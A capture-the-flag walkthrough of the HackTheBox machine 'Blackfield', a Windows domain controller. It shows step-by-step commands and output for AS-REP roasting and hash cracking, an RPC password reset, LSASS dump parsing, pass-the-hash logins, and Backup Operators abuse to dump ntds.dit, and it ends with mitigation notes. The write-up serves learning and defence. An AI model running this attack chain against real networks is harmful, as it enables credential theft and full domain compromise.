# Blackfield

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- Openly available shares

__Exploitation__

- Kerberoasting - harvest non-preauth responses

__Priv Esc__

- LSASS dump

- Group policy abuse

***

This is my guide to the HackTheBox Windows machine _Blackfield_. This is my first __Hard__ difficulty box that I've rooted.

## User Flag

First, let's use `nmap` to scan _Blackfield_.

- __sC__: Enable common scripts

- __sV__: version and service on the port

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Tue Jul  7 13:43:23 2020 as: nmap -sC -sV -O -oA scan192 10.10.10.192
Nmap scan report for 10.10.10.192
Host is up (0.12s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-07-08 01:48:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=7/7%Time=5F04C269%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h04m28s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-07-08T01:50:49
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  7 13:46:58 2020 -- 1 IP address (1 host up) scanned in 215.40 seconds
```

Okay, our results are back and it looks like this box is a domain controller, most of the open ports are typically what we should see on a DC.

```
$ sudo nmap -sC -sV -O -p- -oA full180 10.10.10.192
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

A full port scan also reveals that port 5985 is open, which allows remote credentialed access with `WinRM 2.0 (Microsoft Windows Remote Management)`. Next, let's try to enumerate some of the available services for more information.

```
$ enum4linux 10.10.10.192
```

`enum4linux`, a tool to enumerate Windows or Samba systems, yields little. Let's see if any shares are viewable without credentials.

![](images/smb-shares.png)

Success. Trying each one, it looks like we can access the `profiles$` share.

```
$ smbclient \\\\10.10.10.192\\profiles$
```

This reveals a lot of user directories, none of which are accessible. This does, however, give us some credentials to start enumerating. We can use a tool from [Impacket](https://github.com/SecureAuthCorp/impacket) which will check to see if any users have the property "Do not require Kerberos preauthentication" set (`UF_DONT_REQUIRE_PREAUTH`). If this is the case, we will receive a hash.

This is a subset of a process called "kerberoasting", which is described in more detail in [this article](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/). Let's grab all the usernames and save them into a list.

```
$ GetNPUsers.py -dc-ip 10.10.10.192 BLACKFIELD.LOCAL/ -usersfile users -format hashcat -outputfile user.hash
[...]
$krb5asrep$23$support@BLACKFIELD.LOCAL:03fcde2dba3e2be20f5f7671f28a7200$cfc16761e1295b96b10714ee0424df3e1df623d73e606031e5787993565bcbadd2a2228e541aedd208d66e2f185e491306b0aabb9d43b99bc4e86d4370d6fd819f5fa9b11ccd0b07084347f7d854e129b64819de43f9e4ed751e32d339af4dc91d30a4a9fc3d32fa81fff5cb6a0abaf024c0402f47f53f228e280a8867cd609f9abb8b583fe03eade58eb980a56996e6093e04cdd20b0eb82c405d02ec9b18c491e304dce940b5a3460f4c02e4c72cf0250806230bd00c31d4588c2dd985ed5a85794aa3f1413a26c941895dedeefd33164f9f620cd54ccacbe65dfe37c6ec394249d8b2212db977f8026c54e8be9f51e3a13632
[...]
```

We receive a hash for the `support` user. We also can see that the users `audit2020` and `svc_backup` are still active accounts. Lets use `john` to see if we can crack the hash and receive a password.

```
$ sudo john user.hash --wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
1g 0:00:00:38 DONE (2020-07-07 14:54) 0.02623g/s 376048p/s 376048c/s 376048C/s #13Carlyn..#*burberry#*1990
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Success, we now have some credentials; the password `#00^BlackKnight`, most likely for the `support` user.

We have no luck trying our newly acquired creds on the various services available, but the user we have access to, `support`, is indicative of where we may have access. We can perform various helpdesk/support functions with RPC, so let's see if we can change the password of one of the other accounts we know about, potentially giving us elevated access.

We'll use `rpcclient` to give this a shot.

```
$ rpcclient -U "support" 10.10.10.192
Enter WORKGROUP\support's password:
rpcclient $>
```

Okay, we have RPC access. [This article](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) has excellent information on how to perform a password reset. Let's give it a shot.

```
rpcclient $> setuserinfo2 audit2020 23 'hello1234!'
```

The account that we can reset the password successfully for is `audit2020`. Let's backtrack a little with our new credentials and see what the `audit2020` user can access. We'll try enumerating the various SMB shares that we found earlier.

```
$ smbclient \\\\10.10.10.192\\forensic -U audit2020%hello1234!
Try "help" to get a list of possible commands.
smb: \>
```

We can access the `forensic` share. Let's see what we can find.

```
> dir
  .                                   D        0  Sun Feb 23 07:03:16 2020
  ..                                  D        0  Sun Feb 23 07:03:16 2020
  commands_output                     D        0  Sun Feb 23 12:14:37 2020
  memory_analysis                     D        0  Thu May 28 15:28:33 2020
  tools                               D        0  Sun Feb 23 07:39:08 2020

                7846143 blocks of size 4096. 3986813 blocks available
```

The `memory_analysis` drive has a `lsass.zip` file. In Windows, the LSASS memory typically stores credentials for users on the machine. Some attacks on Windows environments include dumping LSASS and using a tool like `mimikatz` to extract passwords. Fortunately for us, it looks like we can just grab this file now. Additionally, since this isn't a new dump as far as we can tell, we don't necessarily know if these credentials will still be valid. Let's see what we can find.

```
> cd memory_analysis
> get lsass.zip
```

I'll use the tool [pypykatz](https://github.com/skelsec/pypykatz), which is like `mimikatz` but helps with locally extracting credentials. A great guide can be found [here](https://en.hackndo.com/remote-lsass-dump-passwords/#linux--windows) on Hackndo.

```
$ pypykatz lsa minidump lsass.DMP
[...]
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1d1dcd9250115e2205d9f48400d
                SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
[...]
```
We now have a few different accounts and their NTLM hashes. We can attempt a pass-the-hash attack with `evil-winrm`, which tries remote access utilizing port 5985. Enumerating through our options, we can successfully log in with the `svc_backup` account.

```
$ evil-winrm -H 9658d1d1dcd9250115e2205d9f48400d -u svc_backup -i 10.10.10.192
```

Let's grab the user flag.

![](images/user-flag.png)

## Root Flag

Now, on to root. Let's see what kind of access we have with the `svc_backup` user.

```
> net user svc_backup /domain
User name                    svc_backup
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/23/2020 10:54:48 AM
Password expires             Never
Password changeable          2/24/2020 10:54:48 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   2/23/2020 11:03:50 AM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```

Looks like we are apart of the `Backup Operators` local group. A little research reveals that we can abuse this group to elevate our privileges. More information can be found [here](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#abusing-backup-operators-group).

First, let's create a script text file that will contain parameters for the `diskshadow` command:

```
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  

create  

expose %mydrive% w:  
end backup
```

We will upload it to the box with `evil-winrm` and use the `diskshadow` command.

```
> upload script.txt
> diskshadow /s script.txt
```

In order to emulate the backup software, we need to upload two DLLs found [here](https://github.com/giuliano108/SeBackupPrivilege), import them, and use this to access the shadow copy back up.

```
> upload SeBackupPrivilegeCmdLets.dll
> upload SeBackupPrivilegeUtils.dll
> Import-Module .\SeBackupPrivilegeCmdLets.dll
> Import-Module .\SeBackupPrivilegeUtils.dll
```

Next, we'll grab the `ntds.dit` database file from the shadow copy, then dump the SYSTEM hive.

```
> Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\temp\ntds.dit -Overwrite
> reg save HKLM\SYSTEM c:\temp\system.hive
```

Finally, we will download the two files, the `ntds.dit` and `system.hive` files, to our local box, where we can dump credentials.

![](images/downloads.png)

Back on our box, we'll use the `secretsdump.py` command from Impacket with the SYSTEM hive and `ntds.dit` file as the parameters.

```
$ secretsdump.py -system system.hive -ntds ntds.dit LOCAL > secretsdump.txt
```

From this, we receive a lot of information, but most importantly, we receive the Administrator NTLM hash. Using the same pass-the-hash attack from earlier, we should be able to remotely access the box again, now as the admin.

```
$ evil-winrm -u Administrator -H 184fb5e5178480be64824d4cd53b99ee -i 10.10.10.192
```

Success, let's grab the final flag. Rooted!

![](images/root-flag.png)

***

### Mitigation

- This mitigation is similar to the one from my _Sauna_ box write-up. There a few ways to mitigate the risk of kerberoasting; a strong password policy helps alleviate the chance that someone will crack a hash. Additionally, avoid accounts with pre-authentication. If an organization must have that enabled, they need to have very complex passwords, as the hash is readily exposed. It goes without saying, though, that even if the hash can't be cracked, pass-the-hash attacks can still occur.

- If something as important as the LSASS memory has been dumped, like in this case, then best practice should be changing the passwords for accounts that were included in the dump, or disabling the accounts. Special considerations should be taken when a file like this is created.

- A lot of group policies can be abused and an administrator should carefully consider access to accounts with abusable groups. In this case, a user that can take create backups is especially dangerous, as abuse of this can dump credentials on the machine. This can be devastating on a domain controller.

### Final Thoughts

I really enjoyed this box. It was my first __Hard__ difficulty box and it was definitely tough, but I learned a lot and it was satisfying to complete. I felt it had a lot of realistic aspects, and I really enjoyed the back-and-forth as we found creds and had to backtrack to services we had previously enumerated.
